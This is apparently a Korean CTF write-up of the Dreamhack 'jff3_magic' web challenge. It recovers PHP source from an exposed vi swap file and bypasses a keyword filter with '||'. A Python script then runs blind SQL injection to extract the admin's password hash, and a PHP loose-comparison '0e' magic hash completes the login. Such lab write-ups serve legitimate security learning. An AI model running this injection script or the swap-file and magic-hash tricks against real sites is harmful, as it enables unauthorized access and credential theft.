---
title: (40) Dreamhack [wargame.kr] jff3_magic 문제 풀이
date: 2024-02-17 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
```
This challenge is part of Just For Fun [Season3].
- thx to Comma@LeaveRet
```

## 문제 풀이
이 문제는 vi 에디터가 사용가능한 환경에서만 풀 수 있습니다.
![](https://kyuyeop.github.io/assets/img/post/40/1.png)
사이트에 처음 들어오면 이런 alert이 반겨줍니다. 힌트가 swp라고 하네요.  
  
일단 확인을 눌러보겠습니다.
![](https://kyuyeop.github.io/assets/img/post/40/2.png)
로그인하는 화면 같은게 나옵니다.  
  
아까 힌트로 나온 swp가 뭔지 알아봅시다. 이 문제에서 swp은 스왑파일을 말합니다.
### swp 파일
swp파일은 vi에디터에서 파일 작성중 비정상적으로 종료된 경우 백업의 형태로 생기는 파일입니다. 이 파일은 `.{원본파일명}.swp`이름을 가지고 있으며 `vi -r {swp파일경로}`의 형태로 백업을 복원할 수 있습니다.  
<br>
  
swp이 힌트이므로 아마도 `index.php`의 swp파일이 존재할 것 같습니다.
![](https://kyuyeop.github.io/assets/img/post/40/3.png)
이렇게 `/.index.php.swp`로 들어가면 `index.php.swp`이 다운로드 됩니다.  
이걸 vi를 통해 열어보면 아래와 같은 소스코드를 볼 수 있습니다.
```php
<?php
  include "./lib/lib.php";
  if(!isset($_POST['id']))
    $_POST['id']=NULL;
  if(!isset($_POST['pw']))
    $_POST['pw']=NULL;
  if(!isset($_GET['no']))
    $_GET['no']=NULL;
?>
<!DOCTYPE HTML>
<!--
  Prologue by HTML5 UP
  html5up.net | @n33co
  Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
  <head>
    <title>Magic</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="assets/css/main.css" />
    <script>
      alert("under construction......\n....?\n(hint : swp)  :D"); // This is Hint!!
    </script>
  </head>
  <body>

    <!-- Header -->
      <div id="header">

        <div class="top">

          <!-- Logo -->
            <div id="logo">
              <span class="image avatar48"><img src="images/avatar.jpg" alt="" /></span>
              <h1 id="title">Guest</h1>
              <p>Challenger</p>
            </div>

          <!-- Nav -->
            <nav id="nav">

                   

              <!--
                2. Standard link (sends the user to another page/site)

                   <li><a href="http://foobar.tld" id="foobar-link" class="icon fa-whatever-icon-you-want"><span class="label">Foobar</span></a></li>

              -->
              <ul><li><a href="index.php" id="foobar-link" class="icon fa-whatever-icon-you-want skel-layers-ignoreHref"><span class="label">MemberList</span></a></li>
                <li><a href="?no=2" id="top-link" class="skel-layers-ignoreHref"><span class="">Cd80</span></a></li>
                <li><a href="?no=3" id="portfolio-link" class="skel-layers-ignoreHref"><span class="">Orang</span></a></li>
                <li><a href="?no=1" id="about-link" class="skel-layers-ignoreHref"><span class="">Comma</span></a></li>
              </ul>
            </nav>

        </div>

        <div class="bottom">

          <!-- Social Icons -->
            <!--
            <ul class="icons">
              <li><a href="#" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
              <li><a href="#" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
              <li><a href="#" class="icon fa-github"><span class="label">Github</span></a></li>
              <li><a href="#" class="icon fa-dribbble"><span class="label">Dribbble</span></a></li>
              <li><a href="#" class="icon fa-envelope"><span class="label">Email</span></a></li>
            </ul>
            -->
        </div>

      </div>

    <!-- Main -->
      <div id="main">

        <!-- Intro -->
          <!--
          <section id="top" class="one dark cover">
            <div class="container">

              <header>
                <h2 class="alt">Hi! I'm <strong>C0mma</strong>, I'll introduce<a href="http://html5up.net/license">&nbsp;LeaveRet</a> member<br />
                <!--site template designed by <a href="http://html5up.net">HTML5 UP</a>.</h2>
                <h2 class="alt">Who is the most handsome man?</h2>
                <p>Ligula scelerisque justo sem accumsan diam quis<br />
                vitae natoque dictum sollicitudin elementum.</p>
              </header>

              <footer>
                <a href="#portfolio" class="button scrolly">Vote</a>
              </footer>

            </div>
          </section>
          -->
        <!-- Portfolio -->
          <section id="vote" class="two">
            <div class="container">
              <header>
                <h2>Magic</h2>
              </header>
              <?php
                /******************************************
                Admin check & No Parameter Filtering..
                ******************************************/
                $test = custom_firewall($_GET['no']);
                if ($test != 0){
                  exit("No Hack - ".$test);
                }

                $q = mysqli_query($connect, "select * from member where no=".$_GET['no']);
                $result = @mysqli_fetch_array($q);
  
                echo $result['id']."<br>";

                if(isset($_POST['id'])){
                  sleep(2); // DO NOT BRUTEFORCE
                  $id = mysqli_real_escape_string($connect, $_POST['id']);
                  $q = mysqli_query($connect, "SELECT * FROM `member` where id='{$id}'");
                  $userinfo = @mysqli_fetch_array($q);  
                }
              ?>
              <br>
              <form name="vote" method="post" action="">
                <input type="text" name="id" placeholder="ID"/><br>
                <input type="password" name="pw" placeholder="PW"/><br>
                <button type="submit" value="Vote">Submit</button>
              </form>
              <?php
                if(isset($_POST['id'])){
                  if (hash('haval128,5',$_POST['pw'],false) == mysqli_real_escape_string($connect, $userinfo['pw'])) {
                    echo 'Success! Hello '.$id."<br />";
                    if ($id == "admin")
                      echo 'Flag : '.$FLAG;
                  }
                  else {
                    echo hash('haval128,5',$_POST['pw'], false);
                    echo 'Incorrect Password';
                  }
                }
              ?>
              <!--
              <p>Vitae natoque dictum etiam semper magnis enim feugiat convallis convallis
              egestas rhoncus ridiculus in quis risus amet curabitur tempor orci penatibus.
              Tellus erat mauris ipsum fermentum etiam vivamus eget. Nunc nibh morbi quis
              fusce hendrerit lacus ridiculus.</p>
              -->
              <!--
              <div class="row">
                <div class="4u 12u$(mobile)">
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic02.jpg" alt="" /></a>
                    <header>
                      <h3>Ipsum Feugiat</h3>
                    </header>
                  </article>
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic03.jpg" alt="" /></a>
                    <header>
                      <h3>Rhoncus Semper</h3>
                    </header>
                  </article>
                </div>
                <div class="4u 12u$(mobile)">
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic04.jpg" alt="" /></a>
                    <header>
                      <h3>Magna Nullam</h3>
                    </header>
                  </article>
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic05.jpg" alt="" /></a>
                    <header>
                      <h3>Natoque Vitae</h3>
                    </header>
                  </article>
                </div>
                <div class="4u$ 12u$(mobile)">
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic06.jpg" alt="" /></a>
                    <header>
                      <h3>Dolor Penatibus</h3>
                    </header>
                  </article>
                  <article class="item">
                    <a href="#" class="image fit"><img src="images/pic07.jpg" alt="" /></a>
                    <header>
                      <h3>Orci Convallis</h3>
                    </header>
                  </article>
                </div>
              </div>
              -->
            </div>
          </section>
          
          <!--
          <section id="result" class="three">

            <div class="container">

              <header>
                <h2>Result</h2>
              </header>
          
              parturient nulla quam placerat viverra mauris non cum elit tempus ullamcorper
              dolor. Libero rutrum ut lacinia donec curae mus vel quisque sociis nec
              ornare iaculis.</p>
              
            </div>
          </section>
          -->
        <!-- Contact -->
          <!--
          <section id="contact" class="four">
            <div class="container">

              <header>
                <h2>Contact</h2>
              </header>

              <p>Elementum sem parturient nulla quam placerat viverra
              mauris non cum elit tempus ullamcorper dolor. Libero rutrum ut lacinia
              donec curae mus. Eleifend id porttitor ac ultricies lobortis sem nunc
              orci ridiculus faucibus a consectetur. Porttitor curae mauris urna mi dolor.</p>

              <form method="post" action="#">
                <div class="row">
                  <div class="6u 12u$(mobile)"><input type="text" name="name" placeholder="Name" /></div>
                  <div class="6u$ 12u$(mobile)"><input type="text" name="email" placeholder="Email" /></div>
                  <div class="12u$">
                    <textarea name="message" placeholder="Message"></textarea>
                  </div>
                  <div class="12u$">
                    <input type="submit" value="Send Message" />
                  </div>
                </div>
              </form>

            </div>
          </section>
          -->
      </div>

      <div id="footer">

          <ul class="copyright">
            <li>&copy; LeaveRet. All rights reserved.</li><li>Examiner : <!--<a href="http://html5up.net">-->C0mma</a></li>
          </ul>

      </div>

      <script src="assets/js/jquery.min.js"></script>
      <script src="assets/js/jquery.scrolly.min.js"></script>
      <script src="assets/js/jquery.scrollzer.min.js"></script>
      <script src="assets/js/skel.min.js"></script>
      <script src="assets/js/util.js"></script>
      <script src="assets/js/main.js"></script>

  </body>
</html>
```
좀 길긴 하군요.  
일단 id 부분이 `mysqli_real_escape_string`로 sqli를 방지하고 있고, pw는 아예 id에 대한 유저 정보를 다 들고와서 입력값을 해시처리한 값과 비교하는 방식입니다.  
보면 get으로 no를 받아서 해당하는 유저의 id를 출력해주는 부분이 있습니다. 여기다 `no=0`을 넣어보니 
![](https://kyuyeop.github.io/assets/img/post/40/4.png)
admin이 나옵니다.  
  
보아하니 admin의 pw를 알아야 할것 같습니다. 해시화 되어 있는것 같으니 일단 해시를 찾고 레인보우 테이블을 이용하든 해야겠습니다.
  
no에서 `custom_firewall`을 통과할 수 있다면 sqli가 가능하고 반환이 id만 있으므로 이를 이용해 blind sqli를 해봐야 겠습니다.
```php
if (hash('haval128,5',$_POST['pw'],false) == mysqli_real_escape_string($connect, $userinfo['pw'])) {
```
위 코드를 보면 패스워드를 이용할때 `haval128,5` 해쉬를 사용하고 있는 것을 알 수 있습니다. 이 해시는 길이가 32입니다. 따라서 길이를 구하는 부분은 생략해도 되겠군요.  

`custom_firewall`는 테스트해보니 `or`나 `and`연산자는 막고 있으나, `||`나 `&&`은 막고 있지 않았습니다. `'`나 공백도 사용가능했고 `pw` 같은 키워드도 가능했습니다.
```python
import requests

host = 'http://host3.dreamhack.games:17577/index.php'

pw = ''
for _ in range(32):
    for i in range(48, 122):
        q = f"?no=-1||pw like concat('{pw}',char({i},37))"
        if 'admin' in requests.get(host + q).text:
            pw += chr(i)
            print(pw)
            break
```
그래서 위와 같은 코드를 사용했습니다. `like`를 이용해 뒷부분을 `%`로 처리하면서 앞에서 부터 한글자씩 넣어보고 응답에 `admin`이 포함되면 추가하는 방식입니다.  
  
이를 통해 해시를 찾으면 `0e094737743220655841445846663343`라는 값이 나옵니다.  
  
근데 이 해시, 레인보우 테이블에도 없는 해시입니다. 대신 해시 구조가 좀 특이합니다.  
  
맞습니다. `~e~~~`의 형태, 바로 숫자(float)입니다. `0e094737743220655841445846663343`은 float으로 `0.0`입니다.  
  
마침 또 패스워드 비교를 ==을 이용해 얕은 비교를 진행하고 있습니다. php는 등호 연산에서 int - float - string 순으로 비교합니다.  

따라서 해시 결과값이 0이 되는 매직해시를 사용할 수 있습니다. 매직해시는 [여기](https://github.com/spaze/hashes/blob/master/haval128%2C5.md)서 확인할 수 있습니다.  
  
그중에 하나를 골라서 넣어주면
![](https://kyuyeop.github.io/assets/img/post/40/5.png)
이렇게 flag가 나옵니다.
{% endraw %}